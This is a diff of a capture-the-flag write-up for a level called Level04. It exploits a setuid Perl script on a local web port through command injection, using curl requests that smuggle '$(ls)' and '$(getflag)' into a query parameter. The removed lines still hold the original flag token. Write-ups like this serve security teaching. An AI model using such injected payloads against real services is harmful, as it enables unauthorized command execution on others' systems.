@@ -1,14 +1,11 @@
-## Exploring the exercice
+# Level04
+
+## Exploring the comnputer
 
 ```bash 
 $ ls -la
 total 16
-dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
-d--x--x--x  1 root    users    340 Aug 30  2015 ..
--r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
--r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
 -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
--r-x------  1 level04 level04  675 Apr  3  2012 .profile
 ```
 
 ```bash 
@@ -18,9 +15,9 @@ level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
 
 So we have a perl script 
 
-## Reading doc about Perl
+## Learning more about Perl
 
-Langage initially used for text processing.
+Perl is a high-level, general-purpose programming language known for its strengths in text processing. It was originally developed for report generation and system administration tasks on Unix systems. Today, it's used for scripting, web development, and automating various tasks, especially those involving regular expressions and data parsing.
 
 ## Testing
 
@@ -62,14 +59,15 @@ We know that we pass an argument to a function without checking it, let's try to
 ```bash 
 $ curl 'http://localhost:4747?x=$(ls)'
 level04.pl
-
 ```
+
+## Getting the flag 
 
 It works ! Let's try with getflag then :
 
 ```bash 
 $ curl 'http://localhost:4747?x=$(getflag)'
-Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+Check flag.Here is your token : ******************
 ```
 
 
